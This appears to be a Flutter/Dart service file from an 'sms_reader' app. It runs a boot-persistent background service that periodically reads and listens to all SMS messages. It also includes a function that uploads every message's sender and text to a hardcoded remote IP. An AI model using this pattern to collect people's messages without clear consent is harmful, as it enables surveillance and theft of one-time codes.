import 'dart:async';
import 'dart:convert';
import 'dart:developer';
import 'dart:ui';
import 'package:connectivity/connectivity.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:get/get.dart';
import 'package:sms_reader/auth/model/send_data_model.dart';
import 'package:sms_reader/db/prefs.dart';
import 'package:sms_reader/db/shared_db.dart';
import '../auth/auth_controller.dart';
import '../controller/sms_controller.dart';
import 'package:http/http.dart' as http;

//old code

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  await service.configure(iosConfiguration: IosConfiguration(),
      androidConfiguration: AndroidConfiguration(
          onStart: onStart,
        isForegroundMode: true,
        autoStart: true,
        autoStartOnBoot: true,
      ));
}

@pragma('vm:entry-point')
void onStart(ServiceInstance serviceInstance)async{
  DartPluginRegistrant.ensureInitialized();
  await initPreferences();
  if(serviceInstance is AndroidServiceInstance){
    serviceInstance.on('setAsForeground').listen((event) {
      serviceInstance.setAsForegroundService();
    });

    serviceInstance.on('setAsBackground').listen((event) {
      serviceInstance.setAsBackgroundService();
    });


    serviceInstance.on('stopService').listen((event) {
      serviceInstance.stopSelf();
    });


    final SmsController smsController =Get.put(SmsController());
    // final AuthController authController =Get.put(AuthController(Get.find()));

    Timer.periodic(const Duration(seconds: 12), (timer) async{

      // Check network connectivity
      final connectivityResult = await Connectivity().checkConnectivity();
      if (connectivityResult == ConnectivityResult.mobile || connectivityResult == ConnectivityResult.wifi) {


        smsController.getAllSms();
        // log('pref value :${Prefs.token.value}');
        // if(Prefs.token.value!.isNotEmpty){
        //   sendPostRequest(smsController);
        // }else{
        //   log('No token');
        // }


        log('pref value :${Prefs.token.value}');
        if(Prefs.firstTimeLogin.value == true){
          log('first time true');
          // sendPostRequest(smsController);
          Prefs.firstTimeLogin.updateValue(false);
        }else{
          log('first time false');
          print('listen service running');
          // smsController.listenIncomingSms();

          smsController.listenIncomingSms1();
          // for(var sms in smsController.incomingSmsList){
          //   log("Incoming sms : ${sms.body}");
          //
          // }


          // log("Incoming sms length: ${smsController.incomingSmsList.length}");

        }

        log("connection stabilised");
      } else {
        // No network connectivity, handle accordingly
        log('No network connectivity');
      }



     if(await serviceInstance.isForegroundService()){

       serviceInstance.setForegroundNotificationInfo(title: "sms", content: "sms reader");
       serviceInstance.setAutoStartOnBootMode(true);
       serviceInstance.setAsBackgroundService();
     }

     ///---------------
      ///if firstimelogin = true

     // smsController.getAllSms();
     // print('listen service running');
     // smsController.listenIncomingSms();


    });

  }

}


Future<void> sendPostRequest(SmsController smsController) async {
  final url = Uri.parse('http://18.136.115.162/api/sms/send-all-messages'); // Replace with your API endpoint URL

   List<SendDataModel> myModels= [];
  log("sms list ${smsController.allSmsList}");

  for(var sms in smsController.allSmsList){
    myModels.add(
      SendDataModel(
        sender: sms.address ?? '',
        content: sms.body ?? '',
        recivedSimNumber: "04145",
        simReceivedTimestamp: "2024-01-31T07:30:00Z",
        simName: "Airtel",
      ),
      // Add more instances as needed
    );
  }

  log("mymodel ${myModels}");

  final List<Map<String, dynamic>> jsonDataList = myModels.map((model) => model.toJson()).toList();
  log("mymodel2 ${jsonDataList}");
  log("mymodel3 ${jsonEncode(jsonDataList)}");

  try {
    final response = await http.post(
      url,
      headers: {
        'Content-Type': 'application/json',
        'Authorization' : Prefs.token.value!
      },
      body: jsonEncode(jsonDataList),
    );

    if (response.statusCode == 201 || response.statusCode == 200) {
      print('Response data: ${response.body}');
      print('Success: ');
    } else {
      print('Request failed with status code: ${response.statusCode}');
      print('Response data: ${response.body}');
    }
  } catch (error) {
    print('Error: $error');
  }
}